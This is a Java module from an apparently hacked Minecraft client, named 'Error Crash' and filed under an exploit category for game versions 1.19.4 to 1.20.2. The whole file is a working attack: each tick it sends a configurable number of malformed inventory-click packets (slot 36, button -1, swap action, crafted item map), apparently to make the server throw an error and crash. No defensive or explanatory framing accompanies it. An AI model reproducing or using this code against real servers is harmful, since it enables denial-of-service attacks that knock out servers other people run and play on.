package me.carrot0322.triplesense.features.modules.exploit;

import com.google.common.eventbus.Subscribe;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import me.carrot0322.triplesense.event.impl.GameLeftEvent;
import me.carrot0322.triplesense.features.modules.Module;
import me.carrot0322.triplesense.features.settings.Setting;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

public class ErrorCrash extends Module {
    private final Setting<Integer> packets = register(new Setting<>("Packets", 6, 1, 40));
    private final Setting<Boolean> autoDisable = register(new Setting<>("Auto Disable", true));
    public ErrorCrash() {
        super("Error Crash", "1.19.4~1.20.2", Category.EXPLOIT, true, false, false);
    }

    @Override
    public void onUpdate() {
        var handler = mc.player.currentScreenHandler;
        Int2ObjectArrayMap<ItemStack> itemMap = new Int2ObjectArrayMap<>();
        itemMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
        for (int i = 0; i < packets.getValue(); i++) {
            mc.player.networkHandler.sendPacket(
                    new ClickSlotC2SPacket(
                            handler.syncId,
                            handler.getRevision(),
                            36,
                            -1,
                            SlotActionType.SWAP,
                            handler.getCursorStack().copy(),
                            itemMap
                    )
            );
        }

    }

    @Subscribe
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.getValue()) toggle();
    }
}
